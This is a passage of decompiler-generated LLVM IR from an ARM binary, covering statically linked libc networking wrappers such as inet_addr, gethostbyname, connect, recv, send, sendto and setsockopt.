  uselistorder i32 %v0_16504, { 1, 2, 0, 3 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_16518 = ptrtoint i32* %stack_var_-12 to i32
  %v0_1651c = load i32, i32* @r0, align 4
  %v2_1651c = inttoptr i32 %v0_1651c to i8*
  %v3_1651c = call i32 @inet_aton(i8* %v2_1651c, i32 %v2_16518)
  %v2_16520 = icmp eq i32 %v3_1651c, 0
  %v4_16524 = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_16520, i32 -1, i32 %v4_16524
  ret i32 %storemerge
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  store i32 2, i32* @r1, align 4
  %v0_16544 = call i32 @__GI_gethostbyname2()
  ret i32 %v0_16544
}

define i32 @__GI_gethostbyname2() local_unnamed_addr {
entry:
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %v3_16554 = load i32, i32* @r4, align 4
  %v0_16570 = load i32, i32* @r0, align 4
  %v3_16574 = load i32, i32* @global_var_32044.1421, align 4
  %v0_16578 = call i32 @__aeabi_read_tp()
  %v2_16580 = add i32 %v3_16574, %v0_16578
  store i32 %v2_16580, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 25860), i32* @r3, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 26300), i32* @r2, align 4
  %v1_165a0 = call i32 @gethostbyname2_r(i32 %v0_16570)
  store i32 %v3_16554, i32* @r4, align 4
  ret i32 %tmp4
}

define i32 @function_165bc(i16* %arg1) local_unnamed_addr {
dec_label_pc_165bc:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_165bc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_165bc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_165bc
  %v2_165bc = load i32, i32* @r4, align 4
  %v5_165bc = mul i32 %v2_165bc, 1024
  %v6_165bc = and i32 %v5_165bc, %tmp
  %v2_165c0 = trunc i32 %v6_165bc to i16
  store i16 %v2_165c0, i16* %arg1, align 2
  %v5_165c0 = load i32, i32* @ip, align 4
  %v6_165c0 = load i32, i32* %r0.global-to-local, align 4
  %v7_165c0 = sub i32 %v6_165c0, %v5_165c0
  store i32 %v7_165c0, i32* %r0.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_165bc, %bb
  %v8_165c0 = phi i32 [ %tmp, %dec_label_pc_165bc ], [ %v7_165c0, %bb ]
  ret i32 %v8_165c0

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__sys_connect() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_165c4 = load i32, i32* @r7, align 4
  store i32 %v3_165c4, i32* %stack_var_-8, align 4
  %v0_165d0 = load i32, i32* @r0, align 4
  store i32 %v0_165d0, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_165d0, -4095
  br i1 %tmp, label %dec_label_pc_165f8, label %dec_label_pc_165e0

dec_label_pc_165e0:                               ; preds = %entry
  %v0_165e4 = call i32 @__aeabi_read_tp()
  %v3_165e8 = load i16, i16* @global_var_32088.1320, align 2
  %v4_165e8 = sext i16 %v3_165e8 to i32
  %v0_165ec = load i32, i32* %r2.global-to-local, align 4
  %v1_165ec = sub i32 0, %v0_165ec
  store i32 %v1_165ec, i32* %r2.global-to-local, align 4
  %v3_165f0 = add i32 %v4_165e8, %v0_165e4
  %v4_165f0 = inttoptr i32 %v3_165f0 to i32*
  store i32 %v1_165ec, i32* %v4_165f0, align 4
  %v2_165f8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_165f8

dec_label_pc_165f8:                               ; preds = %entry, %dec_label_pc_165e0
  %v1_165fc = phi i32 [ %v0_165d0, %entry ], [ -1, %dec_label_pc_165e0 ]
  %v2_165f8 = phi i32 [ %v3_165c4, %entry ], [ %v2_165f8.pre, %dec_label_pc_165e0 ]
  store i32 %v2_165f8, i32* @r7, align 4
  ret i32 %v1_165fc

; uselistorder directives
  uselistorder i32 %v0_165d0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_165f8, { 1, 0 }
}

define i32 @"$d.10"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_16600:
  %v0_16600 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16600, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_16600
  %v2_16600 = load i32, i32* @fp, align 4
  %v8_16600 = shl i32 %v2_16600, %arg2
  %v9_16600 = and i32 %v8_16600, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_16600, %bb
  %v4_16604 = phi i32 [ %arg1, %dec_label_pc_16600 ], [ %v9_16600, %bb ]
  ret i32 %v4_16604

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_1660c = load i32, i32* @r4, align 4
  store i32 %v3_1660c, i32* %stack_var_-20, align 4
  %v6_1660c = load i32, i32* @r5, align 4
  %v9_1660c = load i32, i32* @r6, align 4
  %v12_1660c = load i32, i32* @r7, align 4
  %v4_16618 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 30124) to i32*), align 4
  %v2_1661c = icmp eq i32 %v4_16618, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_1661c, label %dec_label_pc_16634, label %entry.dec_label_pc_16640_crit_edge

entry.dec_label_pc_16640_crit_edge:               ; preds = %entry
  br label %dec_label_pc_16640

dec_label_pc_16634:                               ; preds = %entry
  store i32 %v3_1660c, i32* @r4, align 4
  store i32 %v9_1660c, i32* @r6, align 4
  store i32 %v12_1660c, i32* @r7, align 4
  %v0_1663c = call i32 @__sys_connect()
  br label %dec_label_pc_16640

dec_label_pc_16640:                               ; preds = %entry.dec_label_pc_16640_crit_edge, %dec_label_pc_16634
  %v0_16640 = call i32 @__libc_enable_asynccancel()
  %v0_16644 = load i32, i32* @r6, align 4
  store i32 %v0_16644, i32* @r1, align 4
  store i32 %v0_16640, i32* @r5, align 4
  %v0_16650 = load i32, i32* @r4, align 4
  store i32 %v0_16650, i32* @r0, align 4
  %v0_16654 = call i32 @__sys_connect()
  store i32 %v0_16654, i32* @r4, align 4
  %v0_1665c = load i32, i32* @r5, align 4
  %v1_16660 = call i32 @__libc_disable_asynccancel(i32 %v0_1665c)
  %v0_16664 = load i32, i32* @r4, align 4
  %v2_1666c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_1666c, i32* @r4, align 4
  store i32 %v6_1660c, i32* @r5, align 4
  store i32 %v9_1660c, i32* @r6, align 4
  store i32 %v12_1660c, i32* @r7, align 4
  ret i32 %v0_16664

; uselistorder directives
  uselistorder label %dec_label_pc_16640, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1667c = load i32, i32* @r7, align 4
  store i32 %v3_1667c, i32* %stack_var_-8, align 4
  %v0_16688 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16688, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_16688, -4095
  br i1 %tmp, label %dec_label_pc_166b0, label %dec_label_pc_16698

dec_label_pc_16698:                               ; preds = %entry
  %v0_1669c = call i32 @__aeabi_read_tp()
  %v3_166a0 = load i16, i16* @global_var_32088.1320, align 2
  %v4_166a0 = sext i16 %v3_166a0 to i32
  %v0_166a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_166a4 = sub i32 0, %v0_166a4
  store i32 %v1_166a4, i32* %r2.global-to-local, align 4
  %v3_166a8 = add i32 %v4_166a0, %v0_1669c
  %v4_166a8 = inttoptr i32 %v3_166a8 to i32*
  store i32 %v1_166a4, i32* %v4_166a8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_166b0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_166b0

dec_label_pc_166b0:                               ; preds = %entry, %dec_label_pc_16698
  %v1_166b4 = phi i32 [ %v0_16688, %entry ], [ -1, %dec_label_pc_16698 ]
  %v2_166b0 = phi i32 [ %v3_1667c, %entry ], [ %v2_166b0.pre, %dec_label_pc_16698 ]
  store i32 %v2_166b0, i32* @r7, align 4
  ret i32 %v1_166b4

; uselistorder directives
  uselistorder i32 %v0_16688, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_166b0, { 1, 0 }
}

define i32 @"$d.9"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_166b8:
  %v0_166b8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_166b8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_166b8
  %v2_166b8 = load i32, i32* @lr, align 4
  %v8_166b8 = shl i32 %v2_166b8, %arg2
  %v9_166b8 = and i32 %v8_166b8, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_166b8, %bb
  %v9_166bc = phi i32 [ %arg1, %dec_label_pc_166b8 ], [ %v9_166b8, %bb ]
  ret i32 %v9_166bc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_166c0 = load i32, i32* @r4, align 4
  store i32 %v3_166c0, i32* %stack_var_-12, align 4
  %v0_166d0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_166d0, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_166d0, -4095
  br i1 %tmp, label %dec_label_pc_166f8, label %dec_label_pc_166e0

dec_label_pc_166e0:                               ; preds = %entry
  %v0_166e4 = call i32 @__aeabi_read_tp()
  %v3_166e8 = load i16, i16* @global_var_32088.1320, align 2
  %v4_166e8 = sext i16 %v3_166e8 to i32
  %v0_166ec = load i32, i32* %r2.global-to-local, align 4
  %v1_166ec = sub i32 0, %v0_166ec
  store i32 %v1_166ec, i32* %r2.global-to-local, align 4
  %v3_166f0 = add i32 %v4_166e8, %v0_166e4
  %v4_166f0 = inttoptr i32 %v3_166f0 to i32*
  store i32 %v1_166ec, i32* %v4_166f0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_166f8.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_166f8

dec_label_pc_166f8:                               ; preds = %entry, %dec_label_pc_166e0
  %v1_166fc = phi i32 [ %v0_166d0, %entry ], [ -1, %dec_label_pc_166e0 ]
  %v2_166f8 = phi i32 [ %v3_166c0, %entry ], [ %v2_166f8.pre, %dec_label_pc_166e0 ]
  store i32 %v2_166f8, i32* @r4, align 4
  ret i32 %v1_166fc

; uselistorder directives
  uselistorder i32 %v0_166d0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_166f8, { 1, 0 }
}

define i32 @"$d.8"(i32 %arg1) local_unnamed_addr {
dec_label_pc_16700:
  %v0_16700 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16700, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_16700
  %v2_16700 = load i32, i32* @r7, align 4
  %v5_16700 = udiv i32 %v2_16700, 4
  %v6_16700 = and i32 %v5_16700, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_16700, %bb
  %v4_16704 = phi i32 [ %arg1, %dec_label_pc_16700 ], [ %v6_16700, %bb ]
  ret i32 %v4_16704

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__sys_recv() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16708 = load i32, i32* @r7, align 4
  store i32 %v3_16708, i32* %stack_var_-8, align 4
  %v0_16714 = load i32, i32* @r0, align 4
  store i32 %v0_16714, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_16714, -4095
  br i1 %tmp, label %dec_label_pc_1673c, label %dec_label_pc_16724

dec_label_pc_16724:                               ; preds = %entry
  %v0_16728 = call i32 @__aeabi_read_tp()
  %v3_1672c = load i16, i16* @global_var_32088.1320, align 2
  %v4_1672c = sext i16 %v3_1672c to i32
  %v0_16730 = load i32, i32* %r2.global-to-local, align 4
  %v1_16730 = sub i32 0, %v0_16730
  store i32 %v1_16730, i32* %r2.global-to-local, align 4
  %v3_16734 = add i32 %v4_1672c, %v0_16728
  %v4_16734 = inttoptr i32 %v3_16734 to i32*
  store i32 %v1_16730, i32* %v4_16734, align 4
  %v2_1673c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1673c

dec_label_pc_1673c:                               ; preds = %entry, %dec_label_pc_16724
  %v1_16740 = phi i32 [ %v0_16714, %entry ], [ -1, %dec_label_pc_16724 ]
  %v2_1673c = phi i32 [ %v3_16708, %entry ], [ %v2_1673c.pre, %dec_label_pc_16724 ]
  store i32 %v2_1673c, i32* @r7, align 4
  ret i32 %v1_16740

; uselistorder directives
  uselistorder i32 %v0_16714, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1673c, { 1, 0 }
}

define i32 @"$d.7"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_16744:
  %v0_16744 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16744, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_16744
  %v5_16744 = udiv i32 %arg3, 4
  %v6_16744 = and i32 %v5_16744, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_16744, %bb
  %v10_16748 = phi i32 [ %arg1, %dec_label_pc_16744 ], [ %v6_16744, %bb ]
  ret i32 %v10_16748

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_16750 = load i32, i32* @r4, align 4
  store i32 %v3_16750, i32* %stack_var_-24, align 4
  %v6_16750 = load i32, i32* @r5, align 4
  %v9_16750 = load i32, i32* @r6, align 4
  %v12_16750 = load i32, i32* @r7, align 4
  %v15_16750 = load i32, i32* @r8, align 4
  %v18_16750 = load i32, i32* @lr, align 4
  %v4_1675c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 30124) to i32*), align 4
  %v2_16760 = icmp eq i32 %v4_1675c, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_16760, label %dec_label_pc_16778, label %entry.dec_label_pc_16780_crit_edge

entry.dec_label_pc_16780_crit_edge:               ; preds = %entry
  br label %dec_label_pc_16780

dec_label_pc_16778:                               ; preds = %entry
  store i32 %v3_16750, i32* @r4, align 4
  store i32 %v9_16750, i32* @r6, align 4
  store i32 %v12_16750, i32* @r7, align 4
  store i32 %v15_16750, i32* @r8, align 4
  %v0_1677c = call i32 @__sys_recv()
  br label %dec_label_pc_16780

dec_label_pc_16780:                               ; preds = %entry.dec_label_pc_16780_crit_edge, %dec_label_pc_16778
  %v0_16780 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_16780, i32* @r5, align 4
  %v0_16794 = load i32, i32* @r4, align 4
  store i32 %v0_16794, i32* @r0, align 4
  %v0_16798 = call i32 @__sys_recv()
  store i32 %v0_16798, i32* @r4, align 4
  %v0_167a0 = load i32, i32* @r5, align 4
  %v1_167a4 = call i32 @__libc_disable_asynccancel(i32 %v0_167a0)
  %v0_167a8 = load i32, i32* @r4, align 4
  %v2_167ac = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_167ac, i32* @r4, align 4
  store i32 %v6_16750, i32* @r5, align 4
  store i32 %v9_16750, i32* @r6, align 4
  store i32 %v12_16750, i32* @r7, align 4
  store i32 %v15_16750, i32* @r8, align 4
  store i32 %v18_16750, i32* @lr, align 4
  ret i32 %v0_167a8

; uselistorder directives
  uselistorder label %dec_label_pc_16780, { 1, 0 }
}

define i32 @__sys_send() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_167bc = load i32, i32* @r7, align 4
  store i32 %v3_167bc, i32* %stack_var_-8, align 4
  %v0_167c8 = load i32, i32* @r0, align 4
  store i32 %v0_167c8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_167c8, -4095
  br i1 %tmp, label %dec_label_pc_167f0, label %dec_label_pc_167d8

dec_label_pc_167d8:                               ; preds = %entry
  %v0_167dc = call i32 @__aeabi_read_tp()
  %v3_167e0 = load i16, i16* @global_var_32088.1320, align 2
  %v4_167e0 = sext i16 %v3_167e0 to i32
  %v0_167e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_167e4 = sub i32 0, %v0_167e4
  store i32 %v1_167e4, i32* %r2.global-to-local, align 4
  %v3_167e8 = add i32 %v4_167e0, %v0_167dc
  %v4_167e8 = inttoptr i32 %v3_167e8 to i32*
  store i32 %v1_167e4, i32* %v4_167e8, align 4
  %v2_167f0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_167f0

dec_label_pc_167f0:                               ; preds = %entry, %dec_label_pc_167d8
  %v1_167f4 = phi i32 [ %v0_167c8, %entry ], [ -1, %dec_label_pc_167d8 ]
  %v2_167f0 = phi i32 [ %v3_167bc, %entry ], [ %v2_167f0.pre, %dec_label_pc_167d8 ]
  store i32 %v2_167f0, i32* @r7, align 4
  ret i32 %v1_167f4

; uselistorder directives
  uselistorder i32 %v0_167c8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_167f0, { 1, 0 }
}

define i32 @"$d.6"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_167f8:
  %v0_167f8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_167f8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_167f8
  %v5_167f8 = udiv i32 %arg2, 4
  %v6_167f8 = and i32 %v5_167f8, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_167f8, %bb
  %v7_167fc = phi i32 [ %arg1, %dec_label_pc_167f8 ], [ %v6_167f8, %bb ]
  ret i32 %v7_167fc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_16804 = load i32, i32* @r4, align 4
  store i32 %v3_16804, i32* %stack_var_-24, align 4
  %v6_16804 = load i32, i32* @r5, align 4
  %v9_16804 = load i32, i32* @r6, align 4
  %v12_16804 = load i32, i32* @r7, align 4
  %v15_16804 = load i32, i32* @r8, align 4
  %v18_16804 = load i32, i32* @lr, align 4
  %v4_16810 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 30124) to i32*), align 4
  %v2_16814 = icmp eq i32 %v4_16810, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_16814, label %dec_label_pc_1682c, label %entry.dec_label_pc_16834_crit_edge

entry.dec_label_pc_16834_crit_edge:               ; preds = %entry
  br label %dec_label_pc_16834

dec_label_pc_1682c:                               ; preds = %entry
  store i32 %v3_16804, i32* @r4, align 4
  store i32 %v9_16804, i32* @r6, align 4
  store i32 %v12_16804, i32* @r7, align 4
  store i32 %v15_16804, i32* @r8, align 4
  %v0_16830 = call i32 @__sys_send()
  br label %dec_label_pc_16834

dec_label_pc_16834:                               ; preds = %entry.dec_label_pc_16834_crit_edge, %dec_label_pc_1682c
  %v0_16834 = call i32 @__libc_enable_asynccancel()
  %v0_16838 = load i32, i32* @r6, align 4
  store i32 %v0_16838, i32* @r1, align 4
  store i32 %v0_16834, i32* @r5, align 4
  %v0_16848 = load i32, i32* @r4, align 4
  store i32 %v0_16848, i32* @r0, align 4
  %v0_1684c = call i32 @__sys_send()
  store i32 %v0_1684c, i32* @r4, align 4
  %v0_16854 = load i32, i32* @r5, align 4
  %v1_16858 = call i32 @__libc_disable_asynccancel(i32 %v0_16854)
  %v0_1685c = load i32, i32* @r4, align 4
  %v2_16860 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_16860, i32* @r4, align 4
  store i32 %v6_16804, i32* @r5, align 4
  store i32 %v9_16804, i32* @r6, align 4
  store i32 %v12_16804, i32* @r7, align 4
  store i32 %v15_16804, i32* @r8, align 4
  store i32 %v18_16804, i32* @lr, align 4
  ret i32 %v0_1685c

; uselistorder directives
  uselistorder label %dec_label_pc_16834, { 1, 0 }
}

define i32 @__sys_sendto() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_16870 = load i32, i32* @r4, align 4
  store i32 %v3_16870, i32* %stack_var_-16, align 4
  %v0_16884 = load i32, i32* @r0, align 4
  store i32 %v0_16884, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_16884, -4095
  br i1 %tmp, label %dec_label_pc_168ac, label %dec_label_pc_16894

dec_label_pc_16894:                               ; preds = %entry
  %v0_16898 = call i32 @__aeabi_read_tp()
  %v3_1689c = load i16, i16* @global_var_32088.1320, align 2
  %v4_1689c = sext i16 %v3_1689c to i32
  %v0_168a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_168a0 = sub i32 0, %v0_168a0
  store i32 %v1_168a0, i32* %r2.global-to-local, align 4
  %v3_168a4 = add i32 %v4_1689c, %v0_16898
  %v4_168a4 = inttoptr i32 %v3_168a4 to i32*
  store i32 %v1_168a0, i32* %v4_168a4, align 4
  %v2_168ac.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_168ac

dec_label_pc_168ac:                               ; preds = %entry, %dec_label_pc_16894
  %v1_168b0 = phi i32 [ %v0_16884, %entry ], [ -1, %dec_label_pc_16894 ]
  %v2_168ac = phi i32 [ %v3_16870, %entry ], [ %v2_168ac.pre, %dec_label_pc_16894 ]
  store i32 %v2_168ac, i32* @r4, align 4
  ret i32 %v1_168b0

; uselistorder directives
  uselistorder i32 %v0_16884, { 1, 0, 2 }
  uselistorder label %dec_label_pc_168ac, { 1, 0 }
}

define i32 @"$d.5"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_168b4:
  %v0_168b4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_168b4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_168b4
  %v5_168b4 = udiv i32 %arg3, 4
  %v6_168b4 = and i32 %v5_168b4, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_168b4, %bb
  %v9_168b8 = phi i32 [ %arg1, %dec_label_pc_168b4 ], [ %v6_168b4, %bb ]
  ret i32 %v9_168b8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_168bc = load i32, i32* @r4, align 4
  store i32 %v3_168bc, i32* %stack_var_-32, align 4
  %v6_168bc = load i32, i32* @r5, align 4
  %v9_168bc = load i32, i32* @r6, align 4
  %v12_168bc = load i32, i32* @r7, align 4
  %v15_168bc = load i32, i32* @r8, align 4
  %v18_168bc = load i32, i32* @sb, align 4
  %v21_168bc = load i32, i32* @sl, align 4
  %v24_168bc = load i32, i32* @lr, align 4
  %v4_168cc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 30124) to i32*), align 4
  %v2_168d4 = icmp eq i32 %v4_168cc, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_168d4, label %dec_label_pc_168f4, label %dec_label_pc_16900

dec_label_pc_168f4:                               ; preds = %entry
  store i32 %v3_168bc, i32* @r4, align 4
  store i32 %v12_168bc, i32* @r7, align 4
  store i32 %v15_168bc, i32* @r8, align 4
  store i32 %v18_168bc, i32* %sb.global-to-local, align 4
  %v0_168fc = call i32 @__sys_sendto()
  br label %dec_label_pc_16900

dec_label_pc_16900:                               ; preds = %entry, %dec_label_pc_168f4
  %v0_16900 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_16900, i32* @r5, align 4
  %v0_16914 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_16914, i32* @r0, align 4
  %v0_1691c = call i32 @__sys_sendto()
  store i32 %v0_1691c, i32* @r4, align 4
  %v0_16924 = load i32, i32* @r5, align 4
  %v1_16928 = call i32 @__libc_disable_asynccancel(i32 %v0_16924)
  %v0_1692c = load i32, i32* @r4, align 4
  %v2_16934 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_16934, i32* @r4, align 4
  store i32 %v6_168bc, i32* @r5, align 4
  store i32 %v9_168bc, i32* @r6, align 4
  store i32 %v12_168bc, i32* @r7, align 4
  store i32 %v15_168bc, i32* @r8, align 4
  store i32 %v18_168bc, i32* @sb, align 4
  store i32 %v21_168bc, i32* @sl, align 4
  store i32 %v24_168bc, i32* @lr, align 4
  ret i32 %v0_1692c

; uselistorder directives
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16900, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_16944 = load i32, i32* @r4, align 4
  store i32 %v3_16944, i32* %stack_var_-12, align 4
  %v0_16954 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16954, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_16954, -4095
  br i1 %tmp, label %dec_label_pc_1697c, label %dec_label_pc_16964

dec_label_pc_16964:                               ; preds = %entry
  %v0_16968 = call i32 @__aeabi_read_tp()
  %v3_1696c = load i16, i16* @global_var_32088.1320, align 2
  %v4_1696c = sext i16 %v3_1696c to i32
  %v0_16970 = load i32, i32* @r2, align 4
  %v1_16970 = sub i32 0, %v0_16970
  store i32 %v1_16970, i32* @r2, align 4
  %v3_16974 = add i32 %v4_1696c, %v0_16968
  %v4_16974 = inttoptr i32 %v3_16974 to i32*
  store i32 %v1_16970, i32* %v4_16974, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1697c.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1697c

dec_label_pc_1697c:                               ; preds = %entry, %dec_label_pc_16964
  %v1_16980 = phi i32 [ %v0_16954, %entry ], [ -1, %dec_label_pc_16964 ]
  %v2_1697c = phi i32 [ %v3_16944, %entry ], [ %v2_1697c.pre, %dec_label_pc_16964 ]
  store i32 %v2_1697c, i32* @r4, align 4
  ret i32 %v1_16980

; uselistorder directives
  uselistorder i32 %v0_16954, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1697c, { 1, 0 }
}

define i32 @"$d.4"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_16984:
  %v0_16984 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16984, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_16984
  %v2_16984 = load i32, i32* @r6, align 4
  %v5_16984 = udiv i32 %v2_16984, 4
  %v6_16984 = and i32 %v5_16984, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_16984, %bb
  %v10_16988 = phi i32 [ %arg1, %dec_label_pc_16984 ], [ %v6_16984, %bb ]
  ret i32 %v10_16988

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
